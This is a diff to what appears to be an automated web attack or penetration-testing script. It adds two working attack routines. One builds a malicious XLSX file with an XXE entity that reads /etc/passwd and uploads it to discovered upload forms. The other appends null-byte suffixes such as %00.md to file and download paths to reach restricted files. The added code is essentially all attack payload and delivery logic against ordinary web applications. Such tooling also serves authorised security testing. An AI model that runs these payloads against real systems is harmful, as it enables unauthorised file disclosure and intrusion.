@@ -143,6 +143,79 @@
           except Exception:
               continue
 
+  # ── PART B2 — XLSX/DOCX XXE (XML inside ZIP archives) ────────────────────
+  # Office files (xlsx, docx) are ZIPs containing XML — inject XXE in them
+  if upload_forms:
+      import zipfile, io
+      print(f"\n[XXE] Testing upload forms for XLSX/DOCX XXE")
+
+      # Build a malicious XLSX (minimal valid xlsx with XXE in sharedStrings.xml)
+      XLSX_XXE_CONTENT_TYPES = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/></Types>'
+      XLSX_XXE_RELS = '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
+      XLSX_XXE_WORKBOOK = '<?xml version="1.0" encoding="UTF-8"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets></workbook>'
+      XLSX_XXE_SHARED = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"><si><t>&xxe;</t></si></sst>'
+
+      xlsx_buf = io.BytesIO()
+      with zipfile.ZipFile(xlsx_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
+          zf.writestr('[Content_Types].xml', XLSX_XXE_CONTENT_TYPES)
+          zf.writestr('_rels/.rels', XLSX_XXE_RELS)
+          zf.writestr('xl/workbook.xml', XLSX_XXE_WORKBOOK)
+          zf.writestr('xl/sharedStrings.xml', XLSX_XXE_SHARED)
+      xlsx_bytes = xlsx_buf.getvalue()
+
+      for form in upload_forms[:5]:
+          action = form.get('action', BASE)
+          url = action if action.startswith('http') else urljoin(BASE, action)
+          fields = form.get('fields', [])
+          file_field = next((f['name'] for f in fields if f.get('type') == 'file'), None)
+          if not file_field:
+              continue
+          data = {f['name']: f.get('value', '') or 'test' for f in fields
+                  if f.get('name') and f.get('type') != 'file'}
+          for fname, fbytes, ftype in [
+              ('data.xlsx', xlsx_bytes, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'),
+              ('data.xml', XXE_PAYLOADS[0][0].encode(), 'text/xml'),
+          ]:
+              try:
+                  files = {file_field: (fname, fbytes, ftype)}
+                  r = session.post(url, data=data, files=files, timeout=15)
+                  if 'root:x:0:0' in r.text or '/bin/bash' in r.text:
+                      print(f"  [CRITICAL] XXE via {fname} upload: {url}")
+                      xxe_lfi_findings.append({
+                          'url': url, 'type': f'{fname}-xxe',
+                          'desc': f'XXE via {fname} file upload',
+                          'evidence': r.text[:300],
+                      })
+              except Exception:
+                  continue
+
+  # ── PART B3 — Null byte bypass on file access endpoints ─────────────────
+  # Try accessing restricted files with null byte encoding tricks
+  _ftp_paths = [p for p in _G.get('ALL_LINKS', set())
+                if '/ftp/' in p or '/files/' in p or '/download' in p or '/static/' in p]
+  if _ftp_paths:
+      print(f"\n[LFI] Testing {len(_ftp_paths)} file paths for null byte access bypass")
+      for _fp in list(_ftp_paths)[:10]:
+          # Try adding null byte encoded variants to bypass file extension checks
+          for _bypass in ['%2500.md', '%00.md', '%2500.pdf', '%00.txt', '%2500.jpg']:
+              try:
+                  _bypass_url = _fp.rstrip('/') + _bypass
+                  _r = session.get(_bypass_url, timeout=8)
+                  if _r.status_code == 200 and len(_r.text) > 50:
+                      # Check it's not the same as without bypass
+                      _r_orig = session.get(_fp, timeout=8)
+                      if _r_orig.status_code != 200 or abs(len(_r.text) - len(_r_orig.text)) > 50:
+                          print(f"  [CRITICAL] Null byte bypass: {_bypass_url}")
+                          print(f"    Original: {_r_orig.status_code}, Bypass: {_r.status_code} ({len(_r.text)}b)")
+                          xxe_lfi_findings.append({
+                              'url': _bypass_url, 'type': 'null-byte-bypass',
+                              'desc': f'Null byte file access bypass',
+                              'evidence': _r.text[:300],
+                          })
+                          break
+              except Exception:
+                  continue
+
   # ══════════════════════════════════════════════════════════════
   # PART C — Path Traversal / LFI
   # ══════════════════════════════════════════════════════════════
